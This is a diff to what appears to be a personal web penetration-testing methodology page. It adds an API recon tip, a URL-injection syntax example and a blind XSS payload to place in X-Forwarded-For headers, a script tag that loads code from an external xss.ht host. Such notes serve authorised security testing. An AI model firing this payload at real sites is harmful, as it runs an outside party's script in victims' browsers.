@@ -11,7 +11,9 @@ permalink: /web-methodology/
 * [Header Manipulation](#header-manipulation)
 * [Open Redirect](#open-redirect)
 * [DOM Manipulation](#dom-manipulation)
+* [API](#api)
 * [Oneliners](#oneliners)
+* [Tips](#tips)
 
 ---
 
@@ -247,6 +249,10 @@ Send these requests to burp intruder, set the payload for just these parameters 
 * location.replace
 * location.assign
 
+## API
+
+An options request to the api root path sometimes reveals endpoints.
+
 ## Oneliners
 
 Bash loop
@@ -283,4 +289,15 @@ Find lines in file 1 that aren't in file 2
 comm -23 <(sort -u file1.txt) <(sort -u file2.txt)
 ```
 
-## Add the rest of these https://portswigger.net/web-security/all-materials
+## Tips
+
+Can inject into url strings with round brackets.
+```
+Invalid: test${},.@domain.com
+Valid: test($&^%{})@domain.com
+```
+
+Try blind xss payloads in x-forwarded-for headers
+```
+"><script src=https://huwwo.xss.ht></script>
+```
